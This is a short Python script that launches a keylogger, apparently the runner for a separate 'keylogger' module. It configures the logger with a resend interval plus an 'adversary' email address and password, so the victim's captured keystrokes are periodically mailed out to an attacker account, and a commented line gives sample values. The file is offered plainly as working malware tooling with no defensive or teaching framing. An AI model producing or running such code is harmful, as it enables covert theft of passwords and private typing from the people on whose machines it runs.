#!/usr/bin/env python
import keylogger

my_key = keylogger.Keylogger(time_duration_after_which_the_mail_is_sent_again_here, "adversary_mail_here", "adversary_mail's_password_here")
# my_key = keylogger.Keylogger(120, "xyz@abc.come", "passw0rd!")
my_key.start()

